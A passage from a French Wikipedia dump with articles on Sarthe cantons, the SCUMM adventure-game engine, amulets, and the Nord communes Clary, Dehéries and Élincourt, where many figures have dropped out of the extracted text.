Il est à noter également que la commune du Bailleul accueille sur son territoire le Pôle Santé Sarthe et Loir. Ouvert depuis 2007, ce centre hospitalier est né de la fusion des hôpitaux des villes de Sablé-sur-Sarthe et de La Flèche. D'une superficie de , cet hôpital emploie plus de personnes et répond à un bassin de population de 110 000 personnes du sud-Sarthe.
Toujours sur la commune du Bailleul, la Communauté de communes de Sablé-sur-Sarthe, la Communauté de communes du Pays Fléchois et la Communauté de communes du Pays Malicornais ont développé une zone d'activités nommée Ouest Park. Juste à côté du Pôle Santé Sarthe et Loir et de l'échangeur Sablé-La Flèche de l'autoroute A11, cette zone d'activités de 150ha regroupe de nombreuses entreprises du secteur industriel en passant par le secteur tertiaire.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la quatrième circonscription de la Sarthe.
Composition.
Le canton de Malicorne-sur-Sarthe regroupait onze communes et comptait habitants (population municipale ).
À la suite du redécoupage des cantons pour 2015, les communes d'Arthezé, Bousse, Courcelles-la-Forêt, Ligron et Villaines-sous-Malicorne sont rattachées au canton de La Flèche, les communes de Malicorne-sur-Sarthe, Mézeray et Saint-Jean-du-Bois à celui de La Suze-sur-Sarthe, la commune de Noyen-sur-Sarthe à celui de Loué et les communes du Bailleul et Dureil à celui de Sablé-sur-Sarthe.
Contrairement à beaucoup d'autres cantons, le canton de Malicorne-sur-Sarthe n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191870" url="https://fr.wikipedia.org/wiki?curid=191870" title="Canton du Lude">
Canton du Lude

Le canton du Lude est une division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
À la suite du redécoupage cantonal de 2014, les limites territoriales du canton sont remaniées. Le nombre de communes du canton passe de 9 à 23.
Géographie.
Ce canton est organisé autour du Lude dans l'arrondissement de La Flèche. Son altitude varie de 28 m (Luché-Pringé) à 133 m (Chenu) pour une altitude moyenne de 50 m.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la troisième circonscription de la Sarthe.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, trois binômes sont en ballottage : François Boussard et Brigitte Lecor (DVD, 37,92 %), Jean-Claude Barlemont et Jeanne-Marie Gannat (FN, 34,07 %) et Jean-Claude Boiziau et Carine Ménage (Union de la Gauche, 28,01 %). Le taux de participation est de 49,11 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, François Boussard et Brigitte Lecor (DVD) sont élus avec 39,82 % des suffrages exprimés et un taux de participation de 52,25 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton du Lude, ce taux de participation est de 29,39 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : François Boussard et Brigitte Lecor (Union au centre et à droite, 41,43 %) et Renélia Ourtou et Bruno Pinçon (RN, 19,62 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 29,64 % dans le canton du Lude. François Boussard et Brigitte Lecor (Union au centre et à droite) sont élus avec 75,11 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton du Lude regroupait neuf communes.
Les anciennes communes suivantes étaient incluses dans le canton du Lude :
À la suite du redécoupage des cantons pour 2015, toutes les communes à l'exception de Thorée-les-Pins sont à nouveau rattachées au canton du Lude auquel s'ajoutent les neuf communes du canton de Pontvallain et six communes du canton de Mayet. Thorée-les-Pins est intégrée au canton de La Flèche.
Composition depuis 2015.
Lors du redécoupage de 2014, le canton comptait vingt-trois communes entières.
À la suite de la création de la commune nouvelle du Lude au , le canton comprend désormais vingt-deux communes entières.

</doc>
<doc id="191876" url="https://fr.wikipedia.org/wiki?curid=191876" title="Script Creation Utility for Maniac Mansion">
Script Creation Utility for Maniac Mansion

' – acronyme de " – est un moteur de jeu doté de nombreuses innovations techniques pour l'époque permettant aisément de réaliser un jeu d'aventure graphique et de le porter assez rapidement sur diverses plates-formes. Développé par Ron Gilbert et Aric Wilmunder (alias SCUMM Lord) en 1987 pour Lucasfilm Games, il contenait notamment iMUSE (') et INSANE (""). Régulièrement amélioré par Aric Wilmunder (256 couleurs, gestion plus complète du son et de la musique), sa limitation aux univers 2D a mis un terme à son utilisation lors du passage à la 3D. "SCUMM" a toutefois inspiré le moteur 3D d'aventure graphique de LucasArts : GrimE. "SCUMM" est une marque déposée par LucasArts.
Conception.
Le moteur de jeu est imaginé en 1987 par Ron Gilbert dans le cadre du développement de "". A l’époque, il pense programmer le jeu en assembleur pour le microprocesseur 6502, qui est à l'époque la norme pour les jeux sur Commodore 64. Il réalise cependant rapidement que le jeu est trop complexe pour être facilement programmé dans ce langage et qu'ils ont besoin d’un moteur de jeu similaire à l' de . Gilbert pense au départ utiliser le langage LISP mais il choisit finalement une syntaxe plus proche du C. Il discute du problème avec un autre employé de , Chip Morningstar, qui l'aide à construire les fondations du moteur de jeu que Gilbert va ensuite finaliser. Il conçoit le moteur de jeu afin de le rendre multitâche et ainsi permettre aux concepteurs d’isoler et de manipuler certains objets du jeu indépendamment des autres. La majeure partie des six à neuf premiers mois de développement de "" est ainsi consacrée à la construction du moteur de jeu. Lorsqu’il est encore au lycée, Gilbert apprécie les jeux comme ' ou les titres développés par Infocom, mais il regrette qu’ils ne soient pas dotés de graphismes. Il pense en effet que les éléments visuels incorporés dans les jeux d’aventures par des studios comme ajoutent une dimension supplémentaire au genre et constituent une réelle amélioration. Il regrette en revanche qu’ils soient basés sur une interface en ligne de commande. Son objectif est donc de créer une interface capable de restituer la structure d’un jeu d’aventure en mode texte classique mais qui dispense le joueur de taper des lignes de commandes. Dans ', il regrette en effet qu’il soit nécessaire de deviner la commande à utiliser pour réaliser une action et considère qu’il devrait être possible d’interagir directement avec les éléments qui apparaissent à l’écran. Son raisonnement le conduit à penser que si un élément apparaît à l’écran, le joueur doit pouvoir cliquer dessus et que par extension, le joueur doit également pouvoir cliquer sur une commande. Il imagine alors une nouvelle interface plus simple, basée sur le principe du pointer-et-cliquer, qui dispense le joueur de taper des lignes de commandes. Il répertorie au départ une quarantaine de commandes verbales puis simplifie peu à peu cette liste jusqu’à la réduire à douze commandes essentielles. Il intègre ensuite celles-ci dans le langage de script de manière à créer un interpréteur similaire à ceux utilisés par Sierra, comme l' et le . Après environ un an de développement, il termine le moteur de jeu qu’il baptise . Celui-ci permet notamment aux développeurs de s’affranchir de programmer en langage de bas niveau, ce qui réduit le temps nécessaire pour développer d’autres jeux du même type. Il permet aussi de faciliter l’adaptation du jeu à d’autres plates-formes.
Evolutions.
Après la sortie de "" en 1987, le est réutilisé dans de nombreux jeux d’aventure développés par LucasArts. Il est donc peu à peu amélioré afin de bénéficier des avancées technologiques et de s’adapter aux besoins de ces nouveaux titres. Ainsi, les commandes verbales introduites dans ' deviennent plus abstraites dans les versions suivantes du moteur. Pour "Indiana Jones et la Dernière Croisade", les développeurs ajoutent deux nouvelles commandes, et , et un système de dialogue permettant au joueur de choisir une réplique parmi celles qui lui sont proposées. ' utilise la même version du moteur de jeu que son prédécesseur mais bénéficie tout de même de quelques améliorations. Ainsi, les développeurs ajoutent un nouveau système d’arbre de dialogue pour simplifier les conversations et les duels d’insultes. Ils suppriment également la commande qui permet d’obtenir la description d’un objet, celle-ci s'affichant dans le jeu dès que le curseur de la souris passe sur l’objet. Enfin, certaines commandes deviennent automatiques et peuvent être déclenchées avec un simple clic, la commande s'activant par exemple par défaut lorsque le joueur clique sur un personnage. Ces améliorations de l’interface deviennent ensuite des standards pour les titres développés par le studio. Le rendu graphique du SCUMM est également amélioré. Les limitations imposées par les graphismes de la première version, qui permettent un affichage en et 16 couleurs, deviennent en effet trop contraignantes, ce qui oblige les artistes à utiliser des couleurs pour certains arrières-plans. LucasArts développe donc une version du moteur compatible avec le , qui élimine ces problèmes en permettant au jeu de fonctionner en 256 couleurs et donc de concevoir des arrière-plans et des personnages plus colorés et détaillés.
Pour "", le moteur de jeu se voit doté en 1991 d’un nouveau système de synchronisation audio baptisé (iMUSE). Développé par Michael Land et Peter McConnell, celui-ci permet de synchroniser les pistes audio avec les événements se déroulant dans le jeu. Ainsi, la musique du jeu s’adapte en fonction des environnements ou des situations dans lesquels se trouve le joueur, le passage d’une piste audio à une autre se faisant de manière logique. En plus d’être intégré au moteur de jeu, et donc d’être utilisé dans tous les jeux d'aventure basé sur ce dernier, le système iMUSE est également utilisé dans d’autres titres développés par LucasArts, tel "".
Pour ', les développeurs poussent le moteur de jeu dans ses derniers retranchements. Ils imaginent donc des solutions pour en contourner les limitations et, pour intégrer des éléments de jeux d’action, ils intègrent au SCUMM le moteur de streaming vidéo INSANE initialement développé par LucasArts pour ' sorti en 1993.
Principe.
L'exécutable de SCUMM est un interprète de ressources (images, sons, vidéos) et de scripts contenus dans des fichiers à part. L'avantage d'utiliser ce principe est que d'un jeu à un autre (en excluant les changements de version pour améliorations), on peut conserver le même interprète et changer uniquement les ressources pour obtenir un nouveau jeu. De même, pour convertir un jeu "SCUMM" vers une autre plate-forme, il suffit de réécrire l'interprète pour cette plate-forme. Ce mécanisme a permis à des fans de développer un interprète multiformats et multiplates-formes qui ne nécessite donc que les fichiers de ressources d'un jeu pour pouvoir le lancer : ScummVM.
Interpréteur.
L'interpréteur contient la boucle de jeu principale, les fonctions d'affichage, et les fonctions d'exécution du langage de script. Il est dépendant de l'architecture et de la version du format SCUMM utilisée.
Fichiers de ressources.
Ces fichiers changent d'extension selon le jeu et la version du format SCUMM (LFL, DOT, …). Ils sont structurés par blocs arborescents, dont la structure change elle aussi selon la version. On y retrouve néanmoins un certain nombre d'éléments communs :
Recherche de chemin.
Dans un jeu d'aventure graphique en pointer-et-cliquer, le joueur contrôle le personnage principal en lui ordonnant de se déplacer dans une zone de la carte. Un algorithme de planification se charge ensuite de calculer un chemin afin de déplacer le personnage de manière crédible. Dans SCUMM, les parties accessibles d'une carte (zones où les personnages peuvent marcher) sont décrites par un graphe de boîtes (polygones convexes) dont chaque relation indique que les deux boîtes sont adjacentes. SCUMM utilise des boîtes trapézoïdales. En utilisant suffisamment de trapèzes, il est toujours possible de décrire toute la surface parcourable de la carte.

</doc>
<doc id="191883" url="https://fr.wikipedia.org/wiki?curid=191883" title="Tabaré Ramón Vázquez Rosas">
Tabaré Ramón Vázquez Rosas



</doc>
<doc id="191886" url="https://fr.wikipedia.org/wiki?curid=191886" title="Cocopaq">
Cocopaq



</doc>
<doc id="191888" url="https://fr.wikipedia.org/wiki?curid=191888" title="Amulette">
Amulette

Une amulette est un objet que l'on porte sur soi et auquel on accorde des vertus de protection ou qui porte chance. Les amulettes varient énormément selon le lieu, l'époque ou la religion.
Il ne faut pas confondre les amulettes avec les talismans. Les premières visent à se protéger (les amulettes de protection ont des fonctions apotropaïques et prophylactiques) tandis que les seconds peuvent avoir des fonctions supplémentaires (obtenir des pouvoirs magiques offensifs).
Pour certains auteurs il convient de distinguer une amulette du talisman et du pentacle.
Formes.
Une amulette peut être une gemme, une pièce, un sigil, un dessin, un pendentif, une plante, un animal, un geste, etc. 
Chaque signe du zodiaque a une gemme associée qui sert d'amulette, mais celle-ci dépend des coutumes.
Les symboles religieux en jouent souvent le rôle, que ce soit l'image d'un dieu ou un symbole représentant la divinité (comme la croix chrétienne ou l'œil d'Horus dans l'Égypte antique). Même les mots peuvent dans certains cas être utilisés, ainsi « "vade retro, Satanas" », (latin « va-t-en, Satan ») pour chasser le Mal ou la malchance.
Les amulettes sont également liées à la démonologie et la sorcellerie, qui considèrent qu'une croix ou un pentagramme inversé facilite la communication avec les démons.
Utilisation.
Les amulettes peuvent être destinées à protéger une personne, un foyer, un immeuble ou même un village entier. Dans l'ancienne Babylone, on avait pour coutume de porter de minuscules cylindres d'argile incrustés de pierres précieuses pour tenir à distance les Mauvais Esprits. 
Les Romains, quant à eux, collectionnaient les statues de Priape, le dieu de la Chance et de la Fertilité, et de nombreux Américains, aujourd'hui encore, accrochent des fers à cheval au-dessus de leur porte pour se protéger de la malchance et des visiteurs indésirables.
Aussi loin que nous puissions remonter, toutes les sociétés avaient des amulettes. Les toutes premières n'étaient sans doute que des éclats de pierre ou de métal dont la forme et la couleur inhabituelles pouvaient suggérer des propriétés magiques .
En Asie, en Inde et en Thaïlande, on utilise encore des fragments de corail rose pour se protéger du mauvais œil, les moines bouddhistes fabriquent également des amulettes de protection auxquelles ils attribuent des pouvoirs magiques, chaque amulette aurait son propre pouvoir (chance, fortune, guérison, protection, etc.). 
Malgré les passages dans la Torah qui condamnent la divination et la magie, les amulettes sont aussi présentes dans le Judaïsme. On y trouve des symboles juifs, comme l’étoile de David, la ménorah, la main Chamsa et les lettrages Chai (« vivant! » en hébreu) et Shaddaï (nom de Dieu). Les traditions régionales autour de la naissance des enfants comprenaient souvent des amulettes destinées à repousser le diable, le mauvais œil ou des démons comme Lilith. Les soi-disant rabbins miraculeux (Ba'al Shem) étaient chargés d'écrire des amulettes et d'invoquer les noms de Dieu et des anges gardiens. Les sages-femmes fabriquaient également des amulettes, souvent remplies d'herbes. Dans le sud de l'Allemagne, en Alsace et dans certaines régions de la Suisse, les garçons juifs portaient des colliers textiles pour leur Brit Milah. Des pièces de monnaie ou des pierres de corail accrochées à ces colliers devaient détourner le mauvais œil des garçons et servir ainsi de protection. Cette coutume a perduré jusqu'au début du .
Au fil du temps, il est devenu courant de fabriquer des amulettes en forme d'animaux, de symboles magiques ou encore des statuettes de dieux ou de déesses. Partout dans le monde on retrouve des images de cornes, de mains (qui symbolisent la fertilité et la vie), ainsi que des yeux dessinés ou sculptés (qui suggèrent la vigilance éternelle). Parfois aussi sont gravés des , des sorts et des noms de divinités.
Bien qu'elles aient du succès aux quatre coins du monde, on associe souvent les amulettes aux anciens Égyptiens, qui en portaient en toute occasion, jusque dans leur tombe. Il était courant d'enterrer une momie avec des dizaines d'amulettes en forme de scarabée. Ces petites figurines de pierre devaient empêcher l'âme du défunt d'être dévorée par Ammout. Il semblerait que, plus le défunt avait été un personnage important de son vivant, plus il emportait d'amulettes-scarabées avec lui dans sa tombe. Lorsque l'on découvrit le corps du pharaon Toutânkhamon, en , plus de étaient glissés dans les bandages qui l'enveloppaient. Mais les vivants aussi savaient s'entourer : les amulettes appelées ânkh (un hiéroglyphe symbolisant la vie) et oudjat (ou œil d'Horus) protégeaient de la mort, de la maladie et du mauvais œil.
Le pouvoir des amulettes n'est cependant pas perçu comme illimité. Par exemple, elles ne protègent que des dangers contre lesquels elles ont été fabriquées.

</doc>
<doc id="191890" url="https://fr.wikipedia.org/wiki?curid=191890" title="Liste des styles musicaux">
Liste des styles musicaux



</doc>
<doc id="191894" url="https://fr.wikipedia.org/wiki?curid=191894" title="Baladiffusion">
Baladiffusion



</doc>
<doc id="191896" url="https://fr.wikipedia.org/wiki?curid=191896" title="Clary">
Clary

Clary est une commune française située dans le département du Nord, en région Hauts-de-France.
Ses habitants sont appelés les Clarysiens.
Géographie.
Clary est une commune du Cambrésis.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le ruisseau d'Iris.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Clary est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Caudry, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (89,9 % en 2018), une proportion sensiblement équivalente à celle de 1990 (90,3 %). La répartition détaillée en 2018 est la suivante : 
terres arables (82,9 %), zones urbanisées (8,7 %), prairies (7 %), forêts (1,4 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
On trouve le village mentionné au long des sous les noms "Cléry" ou "Kléry", "Clary" dès 1164, "Kleriacus", "Kailris", "Clerium". Boniface fait dériver le nom des bas-fonds de terre glaise remplis en hiver d'eau claire qui entouraient le village. Mannier y voit plutôt un nom d'homme, « Clarus », ou « Karle » pour Charles.
Histoire.
Le plus ancien document où est mentionné le village est une charte de l'évêque de Cambrai Nicolas de Chièvres, qui confirme la propriété du village à l'abbaye d'Honnecourt.
Héraldique.
Il s'agit des de la maison de Melun.
Politique et administration.
Maire en 1802-1803 : Pierre J. Leduc, père.
Maire en 1807-1808 : Michel.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 32,3 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 24,7 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,09 % d'hommes, légèrement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191897" url="https://fr.wikipedia.org/wiki?curid=191897" title="Dehéries">
Dehéries

Dehéries est une commune française située dans le département du Nord (59), en région Hauts-de-France.
Ses habitants sont appelés les "Dehérisiens". Avec 37 habitants en 2019, la commune a la particularité d'être la plus petite du département du Nord par sa population, et l'une des plus petites par sa superficie de .
Géographie.
Situation.
Le village est situé entre dans le sud du département du Nord, à au sud-est de Cambrai et de Bohain-en-Vermandois à vol d'oiseau.
Voies de communication et transports.
Le village est traversé par la route départementale D960, qui relie Cambrai à Guise, dans l'Aisne. Il n'est desservi par aucune ligne de transport en commun.
Hydrographie.
La commune est située dans le bassin Artois-Picardie. Elle n'est drainée par aucun cours d'eau.
Dehéries est installée sur des couches de calcaire du crétacé recouvertes de lœss et de limons accumulés par les vents, qui rendent le sol très fertile. C'est une terre à blé et à betteraves. Le paysage de la commune est dominé par l'openfield mais bordé au nord par les bois du Moulin et du Gard, qui entourent le village de Walincourt.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Dehéries est catégorisée commune rurale à habitat très dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine et hors attraction des villes.
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (100 % en 2018), une proportion identique à celle de 1990 (100 %). La répartition détaillée en 2018 est la suivante : 
terres arables (99,6 %), prairies (0,3 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Logement.
En 2008, Dehéries comptait et aucun logement vacant ni résidence secondaire. Les maisons représentaient 100 % de l'ensemble des logements, pourcentage inchangé par rapport au recensement de 1999 et nettement supérieur à celui observé dans le département du Nord (68,6 %).
La part de résidences principales datant d'avant 1949 s'élevait à 62,9 %. Pour les constructions plus récentes, 7,7 % des logements dataient d'entre 1949 et 1974 et 23,1 % d'après 1975, aucun logement n'ayant été construit après 1990
Toponymie.
Le nom de la commune vient de la famille Sohier, seigneurs de la Hérie.
Histoire.
Dehéries a appartenu à la famille Sohier de la Hérie, apparentée aux comtes de Vermandois. Les traces d'un château du , quadrangulaire et entouré de fossés, se distinguent encore à l'est du village.
En 1081, le chapelain de l'évêque Gérard Ier de Cambrai fit don de ses droits sur l'autel de Dehéries à la cathédrale de Cambrai.
Avant la Révolution, Dehéries appartenait à la famille Bourdon et était rattaché à la paroisse de Walincourt. En 1790, les habitants décidèrent de se séparer de Walincourt et de se constituer en commune distincte.
Politique et administration.
Tendances politiques et résultats.
Les consultations électorales récentes dans cette petite commune montrent une préférence marquée pour la droite et l'extrême-droite.
Au premier tour de l'élection présidentielle de 2012, les trois candidats arrivés en tête à Dehéries sont Marine Le Pen (FN, 35,48 %), Nicolas Sarkozy (UMP, 29,07 %) et François Hollande (PS, 16,13 %), avec un taux de participation de 96,88 %.
Au deuxième tour des élections régionales de 2010, 10 des 24 suffrages exprimés sont allés à la liste conduite par Valérie Létard (UMP), 9 à la liste Front National de Marine Le Pen, et 5 à celle de Daniel Percheron (PS), pour un taux de participation de 83,87 %.
Aux élections européennes de 2009, les deux meilleurs scores à Dehéries étaient ceux de la liste du Front national conduite par Marine Le Pen, qui a obtenu soit 25 % des suffrages exprimés (département du Nord 19,55 %), et de la liste de la majorité présidentielle conduite par Dominique Riquet, qui a obtenu soit 20 % des suffrages exprimés (département du Nord 24,57 %), pour un taux de participation de 72,41 %.
Au deuxième tour de l'élection présidentielle de 2007, 65,38 % des électeurs ont voté pour Nicolas Sarkozy (UMP), et 34,62 % pour Ségolène Royal (PS), avec un taux de participation de 100 %.
Au deuxième tour des élections législatives de 2007, 71,43 % des électeurs de Dehéries ont voté pour François-Xavier Villain (UMP) (57,45 % dans la du Nord), et 28,57 % pour Brigitte Douay (PS) (42,55 % dans la circonscription), avec un taux de participation de 100 % à Dehéries et de 60,08 % dans la circonscription.
Administration municipale.
Dehéries est membre de la communauté de communes du Caudrésis - Catésis, qui regroupe 46 communes et plus de .
La commune ayant moins de , son conseil municipal est composé de neuf membres. Depuis 2008 le maire est Robert Hennebelle.
Instances judiciaires et administratives.
La commune de Dehéries est dans le ressort de la cour d'appel de Douai, du tribunal de grande instance, du tribunal d'instance et du conseil de prud'hommes de Cambrai, et à la suite de la réforme de la carte judiciaire engagée en 2007, du tribunal de commerce de Douai.
Jumelages et partenariats.
Au 6 mars 2012, Dehéries n'est jumelée avec aucune autre commune.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 35,0 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 22,5 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 52,63 % de femmes, légèrement supérieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
Il n'existe pas d'établissements scolaires à Dehéries. Les écoles maternelles et primaires les plus proches sont dans les villages voisins de Malincourt, Walincourt-Selvigny et Élincourt. Les collèges les plus proches sont ceux de Walincourt-Selvigny et de Villers-Outréaux.
Santé.
Il n'y a pas de professionnels de la santé à Dehéries.
Sports.
Dehéries a vu passer la quatrième étape du Tour de France en 2010.
Cultes.
Les Dehérisiens disposent d'un lieu de culte catholique, l'église Sainte-Anne, qui fait partie de la paroisse Sainte-Anne-en Cambrésis dans le diocèse de Cambrai.
Économie.
Revenus de la population et fiscalité.
Dehéries comptant moins de 50 ménages, les données relatives aux revenus fiscaux ne sont 
pas diffusées par l'Insee pour respecter le secret statistique.
Emploi.
Dehéries se trouve dans le bassin d'emploi du Cambrésis. L'agence Pôle emploi pour la recherche d'emploi la plus proche sont celles de Caudry et Cambrai.
En 2008, la population de Dehéries se répartissait ainsi : 82,6 % d'actifs, ce qui est supérieur aux 71,6 % d'actifs de la moyenne nationale, et aucun retraité. Le pourcentage de chômeurs était de 8,7 % contre 0 % en 1999.
Entreprises et commerces.
Au 31 décembre 2009, Dehéries comptait 5 établissements.
Répartition des établissements par domaines d'activité
Culture locale et patrimoine.
Lieux et monuments.
Le moulin Brunet est en fait situé sur le finage de Walincourt-Selvigny, à quelques mètres de Dehéries.
Le pigeonnier, construit selon la technique dite des « rouges barres », alternance de lits de briques rouges et de pierres blanches, est la reconstitution récente, menée par l'« association pour la valorisation du patrimoine de Dehéries », d'un pigeonnier du qui se situait dans le village voisin d'Esnes et qui a disparu en 1993.
L'église Sainte-Anne a pour origine une chapelle édifiée en 1835, à laquelle a été ajouté un clocher en 1870-1871. Des travaux d'entretien y ont été faits au début du . Elle est entourée par son cimetière, dans lequel se trouve un petit monument aux morts.
La chapelle Notre-Dame-de-Grâce, construite en 1888, est située rue de l'Église.

</doc>
<doc id="191898" url="https://fr.wikipedia.org/wiki?curid=191898" title="Élincourt">
Élincourt

Élincourt est une commune française située dans le département du Nord (59), en région Hauts-de-France.
Géographie.
Localisation.
La commune d'Élincourt est à la limite administrative du Nord et de l'Aisne.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le Riot Hippolyte.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA). 
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité. 
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Élincourt est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine et hors attraction des villes.
Occupation des sols.
